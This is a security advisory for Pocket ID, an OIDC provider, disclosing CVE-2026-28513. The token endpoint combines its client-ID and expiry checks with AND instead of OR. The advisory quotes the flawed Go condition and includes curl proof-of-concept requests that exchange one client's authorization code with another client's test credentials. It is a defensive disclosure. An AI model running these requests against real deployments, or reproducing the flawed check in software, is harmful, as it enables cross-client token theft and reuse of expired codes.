# Pocket ID: OIDC authorization code validation uses AND instead of OR, allowing cross-client token exchange

**GHSA**: GHSA-qh6q-598w-w6m2 | **CVE**: CVE-2026-28513 | **Severity**: high (CVSS 8.5)

**CWE**: CWE-863

**Affected Packages**:
- **github.com/pocket-id/pocket-id/backend** (go): < 0.0.0-20260307173642-b59e35cb59ae

## Description

### Summary

The OIDC token endpoint rejects an authorization code only when **both** the client ID is wrong **and** the code is expired. This allows cross-client code exchange and expired code reuse.

### Details

`backend/internal/service/oidc_service.go:407`

```go
if authorizationCodeMetaData.ClientID != input.ClientID && authorizationCodeMetaData.ExpiresAt.ToTime().Before(time.Now()) {
    return CreatedTokens{}, &common.OidcInvalidAuthorizationCodeError{}
}
```

`&&` should be `||`. Current behavior:

| Condition | Expected | Actual |
|-----------|----------|--------|
| Wrong client + valid code | Reject | **Accept** |
| Correct client + expired code | Reject | **Accept** |

### PoC

**Prerequisite:** pocket-id running with `APP_ENV=test` and `BUILD_TAGS=e2etest`. The test user (Tim Cook) must have authorized both Nextcloud and Immich OIDC clients (i.e., `user_authorized_oidc_clients` records exist for both). The seed data includes an authorization code `auth-code` issued for the Nextcloud client.

```bash
# 1. Seed test data
curl -X POST "http://localhost:1411/api/test/reset?skip-ldap=true"

# 2. Exchange Nextcloud's auth code using Immich's credentials
curl -X POST http://localhost:1411/api/oidc/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=auth-code" \
  -d "client_id=606c7782-f2b1-49e5-8ea9-26eb1b06d018" \
  -d "client_secret=PYjrE9u4v9GVqXKi52eur0eb2Ci4kc0x" \
  -d "redirect_uri=http://immich/auth/callback"
# Expected: 400 (wrong client)
# Actual: 200 with tokens — access_token.aud = Immich client ID
```

**Verified result:** HTTP 200 with tokens. The `access_token` audience is `606c7782-...` (Immich), despite the authorization code being issued for `3654a746-...` (Nextcloud).

### Impact

Any OIDC client operator can exchange authorization codes issued for other clients, obtaining tokens for users who never authorized that client. Expired authorization codes can also be reused with the correct client until the 24-hour cleanup job runs.
